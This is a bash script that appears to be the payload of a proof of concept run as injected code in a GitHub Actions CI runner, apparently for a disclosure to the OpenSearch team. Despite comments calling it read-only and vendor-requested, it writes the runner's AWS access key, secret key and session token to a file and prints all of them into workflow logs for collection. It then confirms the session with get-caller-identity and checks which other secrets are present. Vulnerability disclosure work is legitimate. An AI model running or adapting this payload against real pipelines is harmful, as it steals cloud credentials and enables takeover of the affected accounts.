#!/usr/bin/env bash
set -u
NONCE_TAG="POC-20260725T085142Z-23679"
echo "=================================================================="
echo "[$NONCE_TAG] attacker-controlled code executed in CI runner"
echo "  repo/workflow/job : ${GITHUB_REPOSITORY:-?} / ${GITHUB_WORKFLOW:-?} / ${GITHUB_JOB:-?}"
echo "  runner host       : $(hostname)"
echo "  executed ref      : ${GITHUB_SHA:-?}   (attacker-controlled)"
echo "------------------------------------------------------------------"
echo "  AWS credential proof (per vendor request — read-only, non-destructive):"

# When AWS credentials are present, persist them to a local file in the
# runner workspace and echo tagged lines so the outer PoC script can capture
# them into the local evidence file from workflow logs.
if [ -n "${AWS_ACCESS_KEY_ID:-}" ]; then
  CREDS_FILE="poc-aws-creds-${NONCE_TAG}.env"
  {
    echo "AWS_ACCESS_KEY_ID=${AWS_ACCESS_KEY_ID}"
    [ -n "${AWS_SECRET_ACCESS_KEY:-}" ] && echo "AWS_SECRET_ACCESS_KEY=${AWS_SECRET_ACCESS_KEY}"
    [ -n "${AWS_SESSION_TOKEN:-}" ]     && echo "AWS_SESSION_TOKEN=${AWS_SESSION_TOKEN}"
  } > "$CREDS_FILE"
  echo "  AWS_ACCESS_KEY_ID (for vendor revocation): ${AWS_ACCESS_KEY_ID}"
  echo "[$NONCE_TAG] AWS credentials saved locally: $(pwd)/${CREDS_FILE}"
  while IFS= read -r line; do
    echo "[$NONCE_TAG] ${line}"
  done < "$CREDS_FILE"
else
  echo "  AWS_ACCESS_KEY_ID : [absent]"
fi

# aws sts get-caller-identity — the standard vendor-requested proof.
# Returns: Account number, Role ARN, User ID. Read-only. No data access.
# Called ONLY because the OpenSearch security team explicitly requested
# credential-reachability proof. No other AWS API is called.
echo ""
echo "  aws sts get-caller-identity output:"
if aws sts get-caller-identity 2>&1; then
  echo "  [confirmed: attacker code holds a valid AWS session for the above role]"
else
  echo "  [get-caller-identity failed — session may not yet be configured]"
fi

echo "------------------------------------------------------------------"
echo "  Other credentials in scope (presence only, values NEVER read):"
present() { if [ -n "${!1:-}" ]; then echo "  [PRESENT] $1"; else echo "  [absent ] $1"; fi; }
present GITHUB_TOKEN; present IT_BASIC_AUTH_PASSWORD; present IT_OPENSEARCH_URL
echo "------------------------------------------------------------------"
echo "[$NONCE_TAG] proof complete — AWS keys saved locally when present;"
echo "  get-caller-identity called (per vendor request). Research stopped here."
echo "=================================================================="
